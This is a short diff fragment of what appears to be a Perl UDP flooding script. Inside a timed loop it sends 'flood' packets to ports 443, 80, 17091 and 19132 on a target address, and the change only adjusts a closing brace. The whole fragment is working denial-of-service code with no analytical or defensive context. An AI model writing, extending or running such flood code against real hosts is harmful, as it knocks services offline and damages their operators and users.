@@ -33,4 +33,5 @@ for (;time() <= $endtime;) {
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("443", $iaddr));
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("80", $iaddr));
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("17091", $iaddr));
-  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("19132", $iaddr));}
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("19132", $iaddr));
+  };
